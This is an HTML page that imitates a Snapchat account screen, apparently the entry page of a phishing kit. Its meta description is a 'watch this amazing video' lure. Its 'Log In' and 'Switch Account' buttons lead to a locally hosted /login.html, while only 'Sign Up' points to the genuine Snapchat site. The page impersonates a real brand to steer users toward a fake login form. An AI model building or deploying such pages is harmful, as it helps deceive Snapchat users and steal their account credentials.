<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
  <link rel="shortcut icon" href="img/faviconV2.png">
  <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
  <title>Snapchat â€¢ Account</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/css/accounts.css">
  <style>
    .button-container {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 30px;
    }

    .button {
      background-color: #fffc00;
      border: none;
      padding: 14px 24px;
      font-size: 16px;
      border-radius: 30px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .button:hover {
      background-color: #ffe600;
    }

    .login-btn {
      display: block;
      margin: 40px auto 10px auto;
      padding: 14px 30px;
      background-color: black;
      color: white;
      font-size: 16px;
      border-radius: 30px;
      border: none;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .login-btn:hover {
      background-color: #333;
    }
  </style>
</head>
<body>

  <!-- Loading Screen -->
  <div class="loader-overlay" id="loading">
    <div class="container-loader">
      <div id="circle-rotation" class="circle"></div>
      <div id="circle-2-rotation" class="circle-2"></div>
    </div>
  </div>

  <!-- Snapchat Logo -->
  <div class="logo">
    <img src="img/icon.svg" alt="Snapchat Logo">
  </div>

  <!-- Login Button -->
  <button class="login-btn" onclick="window.location.href='/login.html';">Log In</button>

  <!-- Signup and Switch Account Buttons -->
  <div class="button-container">
    <div class="button" onclick="window.location.href='https://accounts.snapchat.com/v2/signup';">Sign Up</div>
    <div class="button" onclick="window.location.href='/login.html';">Switch Account</div>
  </div>

  <script src="/js/account.js"></script>
</body>
</html>
